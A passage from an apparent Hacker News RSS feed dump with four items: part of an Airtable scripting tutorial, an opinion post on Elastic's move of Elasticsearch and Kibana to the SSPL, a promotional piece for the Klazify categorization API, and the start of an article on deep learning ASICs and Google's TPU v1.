script that is agnostic to a base, the entire community can benefit. In the marketplace you'll find all sorts of great script examples (in addition to those in the <a href="https://airtable.com/developers/scripting/examples">docs</a>).</p><h3>Elements of a script</h3><p>Before diving into a hands-on example, unpacking the building blocks of Airtable scripts will set the foundation for the rest of this guide.</p><p><strong>Getting data from the base</strong></p><p>Virtually every script (or automation/app for that matter) is going to start off by pulling data from an Airtable base.</p><p>Airtable follows a pretty straightforward relational model. Let's briefly step through it:</p><p>An Airtable workspace can contain many Airtable bases. Your script will run within one of these bases.</p><p>To add a script to a base, you'll install the <a href="https://support.airtable.com/hc/en-us/articles/360043041074-Scripting-app-overview"><strong>Scripting App</strong></a> in your base.</p><p>Then, to access information about the base in a script you'll use the <a href="https://airtable.com/developers/scripting/api/base">base model</a>.</p><p>For instance, if you pop open the scripting app, you can quickly retrieve the name of the Airtable base:</p><pre><p><span>console</span><span>.</span><span>log</span><span>(</span><span>`</span><span>The name of my base is </span><span>${</span><span>base</span><span>.</span><span>name</span><span>}</span><span>.</span><span>`</span><span>)</span><span>;</span><span></span></p></pre><p>Or, get the number of tables in the base:</p><pre><p><span>console</span><span>.</span><span>log</span><span>(</span><span>`</span><span>This base contains </span><span>${</span><span>base</span><span>.</span><span>tables</span><span>.</span><span>length</span><span>}</span><span> tables.</span><span>`</span><span>)</span><span>;</span><span></span></p></pre><p>As the prior query indicates, a base can contain many tables. You can interact with tables using the <a href="https://airtable.com/developers/scripting/api/table">table model</a>. So when you want to work with a table you retrieve it from the base:</p><pre><p><span>let</span><span> table </span><span>=</span><span> base</span><span>.</span><span>getTable</span><span>(</span><span>"Tasks"</span><span>)</span><span>;</span><span></span></p></pre><p>Once you have a table loaded into your script, you can access its <a href="https://airtable.com/developers/scripting/api/view">views</a>, <a href="https://airtable.com/developers/scripting/api/field">fields</a> and <a href="https://airtable.com/developers/scripting/api/record">records</a>.</p><p>A view is simply a filtered set of data in the table. So let's say you want to just pull all the records from a particular view:</p><pre><p><span>let</span><span> table </span><span>=</span><span> base</span><span>.</span><span>getTable</span><span>(</span><span>"Tasks"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> view </span><span>=</span><span> table</span><span>.</span><span>getView</span><span>(</span><span>"Todo"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> query </span><span>=</span><span> </span><span>await</span><span> view</span><span>.</span><span>selectRecordsAsync</span><span>(</span><span>)</span><span>;</span><span></span></p></pre><p>The variable <code>query</code> is now going to contain all the records from the <code>Todo</code> view.</p><p>Now, when you want to inspect just one <code>Todo</code> record, you'll use the <a href="https://airtable.com/developers/scripting/api/record#get-cell-value"><code>getCellValue()</code> function</a>. As so:</p><pre><p><span>let</span><span> table </span><span>=</span><span> base</span><span>.</span><span>getTable</span><span>(</span><span>"Tasks"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> view </span><span>=</span><span> table</span><span>.</span><span>getView</span><span>(</span><span>"Todo"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> query </span><span>=</span><span> </span><span>await</span><span> view</span><span>.</span><span>selectRecordsAsync</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> record </span><span>=</span><span> query</span><span>.</span><span>records</span><span>[</span><span>0</span><span>]</span><span>;</span><span></span></p><p><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>record</span><span>.</span><span>getCellValue</span><span>(</span><span>"Description"</span><span>)</span><span>)</span><span>;</span><span></span></p></pre><p><img src="https://blog.syncinc.so/dev-guide/032_script_example.png" alt="Script example"></p><p>This quickly outlines the practical methods for pulling data from the base. You'll find that Airtable scripts includes some other models to get information on the user (a.k.a collaborator), session and more in the <a href="https://airtable.com/developers/scripting">docs</a>. But retrieving tables and records is the crux of working with data in Airtable.</p><p><strong>Collecting input from the user</strong></p><p>Beyond pulling data from the Airtable base, you'll also want to retrieve inputs from the user.</p><p>You may want to prompt the user for which table they want to evaluate in the script or which file they want to import. To do so, you'll use the <a href="https://airtable.com/developers/scripting/api/input">input object</a>. All input methods are asynchronous, so you'll always prefix each function call with <code>await</code>.</p><p>For instance, to ask the user their name:</p><pre><p><span>let</span><span> name </span><span>=</span><span> </span><span>await</span><span> input</span><span>.</span><span>textAsync</span><span>(</span><span>"What is your name?"</span><span>)</span><span>;</span><span></span></p><p><span>output</span><span>.</span><span>text</span><span>(</span><span>`</span><span>Your name is </span><span>${</span><span>name</span><span>}</span><span>.</span><span>`</span><span>)</span><span>;</span><span></span></p></pre><p><img src="https://blog.syncinc.so/dev-guide/033_name_prompt.png" alt="Name prompt"></p><p>You can have users enter text, click a button, select a table, view, field, or even a record. Combined, these inputs allow your script to interact with the user in all sorts of ways.</p><p><strong>Fetching data from an API</strong></p><p>In addition to collecting data from the Airtable base and user, you can also <a href="https://airtable.com/developers/scripting/api/fetch">fetch data</a> from third-party APIs.</p><pre><p><span>let</span><span> response </span><span>=</span><span> </span><span>await</span><span> </span><span>fetch</span><span>(</span><span>"https://api.github.com/orgs/Airtable"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>await</span><span> response</span><span>.</span><span>json</span><span>(</span><span>)</span><span>)</span><span>;</span><span></span></p></pre><p>If the API you are calling requires authentication, your authentication token will be sitting right in the script. Keep in mind that users can view the underlying code in your script! If you don't trust the user, don't use an API fetch in your script.</p><p>Lastly, when using fetch, consider that <a href="https://airtable.com/developers/scripting/api/fetch#differences-from-fetch-in-the-browser">Airtable is not providing you with full fledge browser fetch</a>.</p><p><strong>Presenting data to the user</strong></p><p>Last but not least, after collecting data from the Airtable base, user or third-party API you'll then process that data and either update data in the base (using the table model functions of <code>createRecordAsync()</code>, <code>updateRecordAsync()</code>, or <code>deleteRecordAsync()</code>) or present data to the user.</p><p>To present a value to the user, you'll use the <a href="https://airtable.com/developers/scripting/api/output"><code>output</code> object</a>. You might output information as the scripts run to keep your user informed or to present a final results. Here is a simple "Hello, world!":</p><pre><p><span>output</span><span>.</span><span>markdown</span><span>(</span><span>"Hello, *world*!"</span><span>)</span><span>;</span><span></span></p></pre><p><img src="https://blog.syncinc.so/dev-guide/034_output.png" alt="Output"></p><p>You can present the user plain text, markdown, or a table.</p><h3>Writing a script</h3><p>Now, let's write a quick script to put these ideas to work.</p><p>To play along with this example (and make this post more enjoyable), you can add <a href="https://airtable.com/templates/sales-and-customers/expvjTzYAZareV1pt/sales-crm">this Sales CRM base template</a> to your workspace by clicking the <strong>Use Template</strong> button.</p><p>This template base is a simple Airtable CRM for tracking sales. As an example, let's say you want to write a script to calculate the current value of all open opportunities in the sales pipeline. This will give you a sense of how much potential revenue is available to the company. To do so, you want to sum up the <code>Estimated Value</code> for all deals that are active - that is, not yet won nor lost.</p><p>First, add the scripting app to the base by clicking the <strong>APPS</strong> button and selecting <strong>+ Install an app</strong>:</p><p><img src="https://blog.syncinc.so/dev-guide/001_add_app.png" alt="Add app"></p><p>Select the <strong>Scripting</strong> app.</p><p><img src="https://blog.syncinc.so/dev-guide/002_select_scripting.png" alt="Scripting app"></p><p>Apps live in Airtable dashboards. So click <strong>Install app</strong> and select the <strong>Sales CRM HQ</strong> dashboard.</p><p><img src="https://blog.syncinc.so/dev-guide/003_select_dash.png" alt="Scripting app"></p><p>The scripting app will now open. Start with a blank slate by deleting the <code>Hello, World</code> example that is pre-loaded.</p><p>Now, write your script. Initiate a variable that will store the total value of the pipeline. You can call it <code>pipeline_value</code>:</p><pre><p><span>let</span><span> …</span></p></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.syncinc.so/dev-guide">https://blog.syncinc.so/dev-guide</a></em></p>]]>
            </description>
            <link>https://blog.syncinc.so/dev-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781916</guid>
            <pubDate>Thu, 14 Jan 2021 20:19:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elasticsearch and Kibana are now business risks]]>
            </title>
            <description>
<![CDATA[
Score 90 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25781695">thread link</a>) | @vmbrasseur
<br/>
January 14, 2021 | https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks | <a href="https://web.archive.org/web/*/https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
          <p><strong> </strong> <time datetime="2021-01-14T00:00:00-08:00">January 14, 2021</time></p>
          
          
            <p> 




  4 minute read

</p>
          
        </header>
      

      <section itemprop="text">
        
        <p>In a play to convert users of their open source projects into paying customers, today Elastic announced that they are <a href="https://www.elastic.co/blog/licensing-change">changing the license</a> of both Elasticsearch and Kibana from the open source Apache v2 license to <a href="https://www.mongodb.com/licensing/server-side-public-license">Server Side Public License</a> (SSPL). If your organisation uses the open source versions of either Elasticsearch or Kibana in its products or projects, it is now at risk of being forced to release its intellectual property under terms dictated by another.</p>

<p>If you’re not yet aware of the SSPL, you can catch up <a href="https://mjg59.dreamwidth.org/51230.html">here</a>. As licenses go, it’s pretty problematic from a business perspective. Every <a href="https://en.wikipedia.org/wiki/Intellectual_property">IP lawyer</a> to whom I’ve showed the text of the SSPL has been rather alarmed before they even reach the end of it. Basically, it’s a hostile proprietary license masquerading in open source clothing. By using an SSPL project in your code, you are agreeing that if you provide an online service using that code then you will release not only that code but also the code for every supporting piece of software, all under the SSPL. It’s not a stretch to interpret the wording of the license as requiring users of the SSPL’d software therefore to release the code for everything straight down to the bare metal. There are those who will point to <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">the FAQ</a> for the SSPL and claim that the license isn’t interpreted in that way because the FAQ says so. Unfortunately, when you agree to a license you are agreeing to the <em>text of that license document</em> and not to a FAQ. If the text of that license document is ambiguous, then so are your rights and responsibilities under that license. Should your compliance to that license come before a judge, it’s <em>their</em> interpretation of those rights and responsibilities that will hold sway. This ambiguity puts your organisation at risk.</p>

<p>In <a href="https://www.elastic.co/blog/licensing-change">its announcement</a>, Elastic claims that this is simply a change of open source license. In one way they’re correct: they’re changing the license away from the open source Apache v2 license. However they are changing to what can best be described as a proprietary source available license, <em>not</em> to an open source one. MongoDB, the originators of SSPL, requested that <a href="https://opensource.org/">Open Source Initiative</a> (OSI) (the standards body that maintains the <a href="https://opensource.org/osd-annotated">Open Source Definition</a> and certifies licenses as open source) certify the SSPL as such. After a great deal of discussion among the panel of legal, licensing, and open source experts, MongoDB withdrew the SSPL from consideration as an open source license, as it appeared highly unlikely it would be certified as open source. That SSPL is not an open source license is no longer in dispute. That ship has sailed. If you have a problem with this, I suggest you <a href="https://lists.opensource.org/pipermail/license-discuss_lists.opensource.org/2019-May/020483.html">take it up</a> with OSI. As for Elastic’s public and verifiably false claim that SSPL is an open source license, it’s my hope that OSI will have a conversation with them and make a public statement of their own shortly.</p>

<p>No, this is a business decision, not an ideological one. Elastic made a business decision to change to this hostile proprietary license to give them a way to <del>extort</del>influence users to become customers. Without a great deal more strategic information about Elastic’s business and operations none of us are qualified to judge whether it’s the correct decision, but the decision itself is valid. They are allowed to make this sort of strategic move for their company.</p>

<p>However, you and your organisation have now also been forced into a business decision. If your organisation uses the Apache v2 licensed Elasticsearch or Kibana in its projects or products, it must now assume that it is at risk one way or another. It can upgrade to version 7.11 of these projects, thereby accepting the terms of SSPL and potentially also being required to release the code for its entire stack (a great deal of which it will not have the copyright over and will be unable to release, thereby potentially being in violation of SSPL). It can remain on version 7.10, but then it will no longer receive future updates, including important security fixes, thereby taking on another sort of risk. It could choose to pay for a Gold+ license for the software, but it’s unlikely that the budget is prepared for this sort of unexpected expense. And finally it can rearchitect its project or product, replacing Elasticsearch and/or Kibana with alternatives. Frankly, considering today’s unfriendly move by Elastic, putting some space between it and your organisation may be the safest alternative in the long run, but it will come with its own considerable price tag in time and other potential opportunity and switching costs.</p>

<p>The one thing your organisation cannot afford to do is ignore this. It’s time to call a meeting with your legal, software development, product, finance, and strategy teams to start to figure out the best option for you.</p>

<blockquote>
  <p>For more information on relicensing moves like this, please see <a href="https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/">The problem with Amazon and Open Source isn’t Amazon</a>.</p>
</blockquote>

<hr>

<blockquote>
  <p>Judging from the bandwidth usage stats on my hosting service, people seem to appreciate this post. Thank you for that. If you’d like me to provide corporate open source strategy for your company, please <a href="https://www.vmbrasseur.com/about/#contact">drop me an email</a>. I’ll soon be kicking my job search into high gear after <a href="https://anonymoushash.vmbrasseur.com/2020/06/01/farewell-juniper">Juniper laid off its open source team</a> last year. Contacting me now makes it more likely your company will be in consideration for my next role.</p>
</blockquote>

        
      </section>

      

      


      
  

    </div></div>]]>
            </description>
            <link>https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781695</guid>
            <pubDate>Thu, 14 Jan 2021 20:02:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Looking for a Free Website Categorization API?]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25781589">thread link</a>) | @alebrega
<br/>
January 14, 2021 | https://www.thestartupfounder.com/looking-for-a-free-website-categorization-api-check-this-company/ | <a href="https://web.archive.org/web/*/https://www.thestartupfounder.com/looking-for-a-free-website-categorization-api-check-this-company/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><strong>Website Categorization API</strong> classifies a site into a <strong>content</strong> <strong>category</strong>. It takes a <strong>URL</strong> as an input and assigns it into the relevant industry. There’s a lot of Categorizations API available on the internet but <a href="https://www.klazify.com/">Klazify</a> seems to be the most popular above all and should suit all your needs.</p>
<p><a href="https://www.klazify.com/">Klazify’s Website Categorization API</a> uses a machine learning (ML) engine to scan a website’s content and meta tags. It extracts text to classify the site and assigns up to three categories aided by natural language processing (NLP).</p>
<p>Their offline database is perfect for customers who require a local option for domain categorization. Typical use cases include hardware/product integrations, custom applications or internal use at an Enterprise organization with high request volume.</p>
<h2><strong>How Klazify works</strong></h2>
<p><a href="https://www.klazify.com/">Klazify</a> will navigate to the requested domain name or URL, collect its content,&nbsp; and determine appropriate categorizes based on a classification taxonomy: IAB V2 Standard, which can be used for 1-1 personalization, marketing segmentation, online filtering and more. The end result is that the URL or domain can now be placed in a specific category.</p>
<h2><strong>State Of The Art Accuracy</strong></h2>
<p>Their&nbsp; website categorization API is highly accurate, a simple lookup to a company’s URL will classify its industry within 385 possible topic categories.</p>
<h2><strong>Domain Processing</strong></h2>
<p><a href="https://www.klazify.com/">Klazify</a>’s domain processing begins one of two ways:</p>
<ul><li>New Domain Ingestion: Klazify examines the website, chasing new domains and re-indexing previously categorized domains.</li></ul>
<ul><li>External feeds: External data sources that are given to Klazify to process</li></ul>
<p><strong>Categorization</strong></p>
<p>Once a URL has been processed and passed the safety checks, it gets categorized.&nbsp;</p>
<h2><strong>Domain Categorization</strong></h2>
<p>There are over a lot of possible topic categories, making the list comprehensive but a little broader compared to other categorization taxonomies.&nbsp;</p>
<p><a href="https://www.klazify.com/category">Klazify’s categorization</a> is ideal for internet filtering and security applications, and best thing of all? They support all the domains available and almost all the languages of the world.</p>
<p>The Classification Taxonomy that Klazify uses is from the IAB, which was referenced before. IAB stands for “Interactive Advertising Bureau.” They’ve created a standard list of categories and subcategories for advertising purposes.</p>
<p>For example, if a publisher is putting together a campaign on Google Ads and only wants to show up on specific websites, Google utilizes the IAB classification to decide which category a certain domain belongs to. This means that if publishers are using Klazify to determine if websites URLs are relevant and pertinent for them to advertise on, the categorization that is given to them in Klazify is also used on advertising websites all over the internet.</p>
<h2><strong>Advertisers</strong></h2>
<p>For Advertisers, <a href="https://www.klazify.com/">Klazify</a> offers domain data categorized to the IAB taxonomy. Through Klazify’s API, customers can process large sets of data, allowing them to identify patterns between IPs and backlinking information or to categorize your data set. Advertisers often find this information useful in order to enhance customer demographics and better understand their behavior.</p>
<p>Once<a href="https://www.klazify.com/"> Klazify</a> finishes categorizing a domain, that domain can then have multiple categories associated with it. While a single website might only be placed in 3 categories using the IAB standards.</p>
<p>The IAB has nearly 385+ possible topic categories to choose from.&nbsp;</p>
<h2><strong>Network &amp; Cybersecurity</strong></h2>
<p>Network and Cybersecurity companies around the globe take advantage of <a href="https://www.klazify.com/">Klazify’s APIs </a>and data feeds to bring industry-leading threat intel and domain categorizations. Typical uses for Klazify include using their Domains API in order to dig deeper into network traffic or using their domain categorization API in order to categorize user access logs. Klazify incorporates over 66 data feeds to augment the engine.</p>
<h2><strong>Why Is <a href="https://www.klazify.com/">Klazify</a> The Best Option For Categorizing a Website?</strong></h2>
<h3><strong>Powerful &amp; Scalable</strong></h3>
<p>Klazify can scale to millions of requests and keep being stable under heavy workloads.</p>
<h3><strong>Easy-to-integrate</strong></h3>
<p>Customer’s time is valuable which is why Klazify’s APIs are simple to use and easy to integrate.</p>
<h3><strong>Dedicated Support Manager</strong></h3>
<p>Their Customer Support Team is always there to answer any questions.</p>
<h3><strong>Simple Documentation</strong></h3>
<p>Each endpoint is well documented with examples so a customer can quickly get started.</p>
<h2><strong>Key Features</strong></h2>
<h3><strong>Big Data</strong></h3>
<p>Using advanced machine learning, <a href="https://www.klazify.com/">Klazify</a> categorize billions of web pages, keeping the categorization database one of the most accurate in the industry.</p>
<h3><strong>Wide Range of Applications</strong></h3>
<p><a href="https://www.klazify.com/">Klazify’</a>s domain categorization allows customers to easily provide services such as Internet filtering, subscriber analytics, advertising networks, and fraud prevention.</p>
<h3><strong>Data Firehose</strong></h3>
<p>Need access to the raw data stream of everything as it’s being categorized? <a href="https://www.klazify.com/">Klazify</a> provides a real-time data firehose via HTTP.</p>
<p><strong>Advanced Algorithms</strong></p>
<p><a href="https://www.klazify.com/">Klazify’s technology</a> categorizes content found on URLs, as well as entire websites and IP addresses, perfect for security devices that may not have access to the full URL.</p>
<h3><strong>Developer-Friendly Responses</strong></h3>
<p>Every API response is returned as JSON, which can be easily read and implemented into your product.</p>
<h3><strong>Always Up to Date</strong></h3>
<p><a href="https://www.klazify.com/">Klazify’s web</a> crawlers are constantly visiting and classifying new and existing websites, providing real-time results and keeping the database always up to date.</p>
<h2><strong>So what’s the difference between the other website categorization API and <a href="https://www.klazify.com/">Klazify</a>?</strong></h2>
<p>The difference between all the other tools and <a href="https://www.klazify.com/">Klazify</a> is that the latter is the closest thing to a real human being checking every nook and cranny of the domain you’re interested in. The bonus is, this tool can do this on hundreds of thousands of websites in a single second for less than $790.00/year.</p>
<p><a href="https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?client_id=24380142150-e2kucj4jf9r4gs2tgej0p6bgjabetibn.apps.googleusercontent.com&amp;redirect_uri=https%3A%2F%2Fwww.klazify.com%2Flogin%2Fgoogle%2Fcallback&amp;scope=openid%20profile%20email&amp;response_type=code&amp;state=44cTTtCgjoFTqsZxXHOX75pYpadRc5DTzwS89tBk&amp;flowName=GeneralOAuthFlow">If you want to try Klazify, you can sign up clicking here</a></p>
<hr>
<p>
<em>
Also published on <a href="https://medium.com/@aleb/looking-for-a-free-website-categorization-api-check-this-company-61012f526396">Medium</a>. </em>
</p>

 </div></div>]]>
            </description>
            <link>https://www.thestartupfounder.com/looking-for-a-free-website-categorization-api-check-this-company/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781589</guid>
            <pubDate>Thu, 14 Jan 2021 19:56:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hardware for Deep Learning. Part 4: ASIC]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25781471">thread link</a>) | @lelf
<br/>
January 14, 2021 | https://blog.inten.to/hardware-for-deep-learning-part-4-asic-96a542fe6a81 | <a href="https://web.archive.org/web/*/https://blog.inten.to/hardware-for-deep-learning-part-4-asic-96a542fe6a81">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><figure><p><img alt="Image for post" src="https://miro.medium.com/proxy/0*fIsAHCkMLWi8Mwfp"></p></figure><div><div><div><div><p><a href="https://moocaholic.medium.com/?source=post_page-----96a542fe6a81--------------------------------" rel="noopener"><img alt="Grigory Sapunov" src="https://miro.medium.com/fit/c/96/96/1*fTggKeGD_XK_nO-qyW3zLw.jpeg" width="48" height="48"></a></p></div></div></div></div><p id="4aeb">This is a part about ASICs from the “Hardware for Deep Learning” series. The content of the series <a href="https://medium.com/@moocaholic/hardware-for-deep-learning-current-state-and-trends-51c01ebbb6dc" target="_blank" rel="noopener">is here</a>.</p><p id="2e3c"><strong><em>As of beginning 2021, ASICs now is the only real alternative to GPUs for <br>1) deep learning training (definitely) or <br>2) inference (less so, because there are some tools to use FPGAs with a not-so-steep learning curve or ways to do efficient inference on CPUs).</em></strong></p><p id="d58c">Now, when every large company launches it’s own DL or AI chip, it’s impossible to be silent. So, ASICs.</p><p id="f2a9">· <a href="#7903" rel="noopener">ASIC</a><br>· <a href="#e04d" rel="noopener">Google TPU</a><br> ∘ <a href="#5531" rel="noopener">TPU v1</a><br> ∘ <a href="#3948" rel="noopener">TPU v2</a><br> ∘ <a href="#641e" rel="noopener">TPU v3</a><br> ∘ <a href="#fb18" rel="noopener">TPU v4</a><br> ∘ <a href="#419a" rel="noopener">TPU POD (and Multi-POD)</a><br>· <a href="#93a6" rel="noopener">Practical considerations</a><br> ∘ <a href="#dddf" rel="noopener">Performance</a><br> ∘ <a href="#1ea2" rel="noopener">Price</a><br> ∘ <a href="#54a9" rel="noopener">Code</a><br>· <a href="#132d" rel="noopener">Habana (acquired by Intel)</a><br> ∘ <a href="#ffc5" rel="noopener">Habana Goya</a><br> ∘ <a href="#875e" rel="noopener">Habana Gaudi</a><br>· <a href="#9e98" rel="noopener">Intel (Nervana) NNP</a><br> ∘ <a href="#86e9" rel="noopener">NNP-T (discontinued)</a><br> ∘ <a href="#d84a" rel="noopener">NNP-I (discontinued)</a><br>· <a href="#6238" rel="noopener">Graphcore IPU</a><br> ∘ <a href="#8e47" rel="noopener">Colossus MK2 GC200 IPU</a><br> ∘ <a href="#a6ef" rel="noopener">Colossus MK1 GC2 IPU</a><br> ∘ <a href="#9592" rel="noopener">IPU architecture</a><br> ∘ <a href="#9ebb" rel="noopener">Systems and PODs</a><br> ∘ <a href="#b484" rel="noopener">Benchmarks</a><br> ∘ <a href="#3b5f" rel="noopener">Software</a><br>· <a href="#3e5b" rel="noopener">Cerebras</a><br> ∘ <a href="#c16c" rel="noopener">Software platform</a><br>· <a href="#9b1c" rel="noopener">AWS</a><br> ∘ <a href="#a621" rel="noopener">AWS Inferentia</a><br> ∘ <a href="#071d" rel="noopener">AWS Trainium</a><br>· <a href="#c995" rel="noopener">Huawei Ascend</a><br> ∘ <a href="#5af5" rel="noopener">Atlas 300I Inference Card</a><br> ∘ <a href="#bf68" rel="noopener">Atlas 300T Training Card</a><br> ∘ <a href="#782e" rel="noopener">DaVinci AI architecture</a><br>· <a href="#d611" rel="noopener">Bitmain Sophon</a><br>· <a href="#aadb" rel="noopener">Alibaba Hanguang 800</a><br>· <a href="#d5be" rel="noopener">Baidu Kunlun</a><br>· <a href="#783c" rel="noopener">Groq</a><br>· <a href="#3b39" rel="noopener">Qualcomm Cloud AI 100</a><br>· <a href="#121a" rel="noopener">Others</a><br>· <a href="#28b8" rel="noopener">Other interesting links</a><br>· <a href="#0ab7" rel="noopener">Summary</a><br>· <a href="#ad26" rel="noopener">Release Notes</a></p><p id="b788"><strong><em>ASIC (application-specific integrated circuit)</em></strong> is an integrated circuit customized for a particular use, rather than intended for general-purpose use like CPU.</p><p id="f6b9">ASICs are more specialized than GPUs because a GPU is still a massively parallel processor with thousands of computational units capable to execute many different algorithms, while an ASIC is a processor designed to be capable of doing a very small set of computations (say, only matrix multiplications). But it does so extremely well.</p><p id="d7af">However, some of the ASICs described here are rather universal computers capable of solving different tasks (and in AI there are many different complex tasks, not only neural networks) but with uncommon (for now) architecture. There are different names for these processors: NPU, XPU, TPU, IPU, and so on, and maybe one day they will become for the computing field the same thing GPU became once.</p><p id="5ad1">Comparing to FPGA, you can’t reprogram ASIC to do a different thing once you need it (but remember, some of them are rather universal), its logic is fixed since being produced, yet on FPGA you can create another circuit that better suits your needs.</p><p id="0465">Due to this specialization, ASICs are usually much more energy efficient. AlphaGo example is a good case. While the first versions of AlphaGo were run on a cluster of CPUs and GPUs (<a href="https://en.wikipedia.org/wiki/AlphaGo#cite_note-DeepMindnature2016-11" target="_blank" rel="noopener">the distributed version in October 2015 was using 1,202 CPUs and 176 GPUs</a>), the later versions used TPUs achieving better results. To make a clear comparison it is required to compare the computing requirements of these algorithms as well, but I think, using here the overall performance + power consumption is a good proxy.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3000/0*gmCI3vWZZ8IPcilM" width="1500" height="762" srcset="https://miro.medium.com/max/552/0*gmCI3vWZZ8IPcilM 276w, https://miro.medium.com/max/1104/0*gmCI3vWZZ8IPcilM 552w, https://miro.medium.com/max/1280/0*gmCI3vWZZ8IPcilM 640w, https://miro.medium.com/max/1400/0*gmCI3vWZZ8IPcilM 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*gmCI3vWZZ8IPcilM?q=20"></p></div></div></div><figcaption><a href="https://deepmind.com/blog/article/alphago-zero-starting-scratch" target="_blank" rel="noopener">https://deepmind.com/blog/article/alphago-zero-starting-scratch</a></figcaption></figure><p id="07b4">Developing specialized hardware is a pretty long-term play.</p><p id="384f"><a href="https://arxiv.org/abs/1911.05289" target="_blank" rel="noopener">According to Google’s Jeff Dean</a>: <em>“Chip design projects that are started today often take 18 months to 24 months to finish the design, fabricate the semiconductor parts and get them back and install them into a production data center environment. </em><strong><em>For these parts to be economically viable, they typically must have lifetimes of at least three years</em></strong><em>. </em><strong><em>So, the challenge for computer architects building ML hardware is to predict where the fast-moving field of machine learning will be in the 2 to 5-year time frame.</em></strong><em>”</em></p><p id="afc1"><a href="https://www.electronicdesign.com/technologies/embedded-revolution/article/21808278/the-economics-of-asics-at-what-point-does-a-custom-soc-become-viable" target="_blank" rel="noopener">More on the economics of ASICs</a>.</p><p id="6771">ASICs are very interesting from different points of view. From the technical point of view, they propose specialized architectures, engineering solutions, and tradeoffs, and that’s a tasty part for the technically inclined people. For practitioners, the most important points are the performance, software support, and last but not least, the price.</p><p id="97f2">There is a lot of movement to ASIC right now. If you heard about Google TPUs (and you couldn’t live the last few years without hearing of them), then you know what is it about. TPU seems to be the most famous example of an ASIC.</p><p id="cb6d">Google <strong>TPU</strong>, or <strong>Tensor Processing Unit</strong>, now exists in its 4th generation (Google Edge TPU is a bit different story, we’ll talk about it in a separate post on Edge AI), yet the latest publicly available is still the 3rd one. The first one, TPU v1 appeared in 2015 and was designed for INT8 inference only. The TPU v2 and v3 were ready for training as well.</p></div></div><div><div><h2 id="5531">TPU v1</h2><p id="0d84">Google’s TPU v1 was put into production in 2015 and it was used internally by Google for their applications. In 2017 Google finally published a technical description of the chip called “<a href="https://arxiv.org/abs/1704.04760" target="_blank" rel="noopener">In-Datacenter Performance Analysis of a Tensor Processing Unit</a>”.</p><p id="32d7"><a href="https://cloud.google.com/blog/products/gcp/google-supercharges-machine-learning-tasks-with-custom-chip" target="_blank" rel="noopener">According to Google</a>, TPU was moved from research into production very fast, just within 22 days from the first tested silicon. Yet the work started in 2013 as a high-priority project when Google’s projections on using their speech technology by users (3 minutes a day) showed that it would require their datacenters to double to meet computation demands. The goal was to improve cost-performance by 10X over GPUs. The full cycle from design, to verification, building, and deploying to the datacenters took <a href="https://arxiv.org/abs/1704.04760" target="_blank" rel="noopener">15 months</a>.</p><p id="825b">No cloud TPU of this version was available to the public.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1580/0*ME21757y0tfrK3f8.png" width="790" height="475" srcset="https://miro.medium.com/max/552/0*ME21757y0tfrK3f8.png 276w, https://miro.medium.com/max/1104/0*ME21757y0tfrK3f8.png 552w, https://miro.medium.com/max/1280/0*ME21757y0tfrK3f8.png 640w, https://miro.medium.com/max/1400/0*ME21757y0tfrK3f8.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ME21757y0tfrK3f8.png?q=20"></p></div></div></div><figcaption><em>Google TPU v1 </em>printed circuit card that fits into a SATA hard disk slot for drop-in installation.</figcaption></figure><p id="7cf7">The TPU was designed to be a coprocessor using a PCIe Gen3 x16 bus that provides 12.5GB/s of effective bandwidth. This choice allows plugging it into existing servers just as GPU does, up to 4 cards in a server. So, TPU v1 is a kind of matrix accelerator on the I/O bus.</p><p id="fa14">To simplify hardware design and debugging, the host server sends TPU instructions for it to execute (like an FPU, floating-point unit) rather than letting TPU fetch instructions by itself (like GPU does).</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1684/1*9uNlFIx5Uic2hoC4jIV6hg.png" width="842" height="623" srcset="https://miro.medium.com/max/552/1*9uNlFIx5Uic2hoC4jIV6hg.png 276w, https://miro.medium.com/max/1104/1*9uNlFIx5Uic2hoC4jIV6hg.png 552w, https://miro.medium.com/max/1280/1*9uNlFIx5Uic2hoC4jIV6hg.png 640w, https://miro.medium.com/max/1400/1*9uNlFIx5Uic2hoC4jIV6hg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*9uNlFIx5Uic2hoC4jIV6hg.png?q=20"></p></div></div></div><figcaption>TPU Block Diagram.</figcaption></figure><p id="57aa">The heart of the TPU, the main computation part, is the yellow Matrix Multiply unit in the 